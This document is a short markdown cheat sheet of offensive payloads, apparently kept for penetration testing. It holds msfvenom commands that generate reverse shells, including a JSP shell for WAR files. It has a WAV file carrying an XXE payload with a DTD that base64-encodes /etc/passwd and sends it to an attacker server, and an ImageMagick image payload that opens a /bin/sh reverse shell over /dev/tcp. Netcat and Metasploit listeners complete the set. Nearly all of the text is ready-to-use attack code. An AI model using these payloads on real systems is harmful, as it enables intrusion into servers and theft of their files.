# Payloads collections

## Summary
* [Commands for Msfvenom](#commands-for-msfvenom)
* [Payload for WAV exploitation](#payload-for-wav-exploitation)
* [Payload for JPG or PNG file](#payload-for-png-or-jpg)
* [Craft scripts with Metasploit](#use-metasploit-to-craft-a-shell-script)
* [Listener with Metasploit](#setup-a-listener-with-metasploit-modules)

## Commands for Msfvenom
```
msfvenom -p [payloads] LHOST=[ip] LPORT=[port] -f [extension] -o [payload name]
```
List all available payloads
```
msfvenom --list payloads
```
Payload for Java code base (.WAR) file
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[ip] LPORT=[port] -f [file type] -o [output]
```

## Payload for WAV exploitation
```
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```
Create a new file NAMEEVIL.dtd
```
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/ passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
```
Start a listener
```
php -S 0.0.0.0:PORT
```
To decode zlip base64 strings
```
<?php echo zlib_decode(base64_decode('base64here')); ?>
```

## Payload for PNG or JPG
```
push graphic-context
encoding UTF-8
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.4.64.135/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
```
Start a listener
```
rlwrap nc -lvnp 80
```

## Use Metasploit to craft a shell script
```
use exploit/multi/script/web_delivery
```

## Setup a listener with Metasploit modules
```
use exploit/multi/handler
```
